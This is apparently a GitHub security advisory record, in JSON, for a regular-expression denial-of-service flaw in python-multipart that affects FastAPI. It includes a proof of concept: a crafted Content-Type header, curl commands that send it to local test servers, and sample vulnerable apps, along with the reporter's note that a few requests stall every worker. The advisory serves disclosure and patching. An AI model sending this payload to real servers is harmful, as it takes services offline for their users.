{
    "ghsaId": "GHSA-2jv5-9r88-3w3p",
    "severity": "HIGH",
    "summary": "python-multipart vulnerable to Content-Type Header ReDoS",
    "description": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nThis is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
    "permalink": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p",
    "publishedAt": "2024-02-12T17:28:12Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-2jv5-9r88-3w3p"
        },
        {
            "type": "CVE",
            "value": "CVE-2024-24762"
        }
    ]
}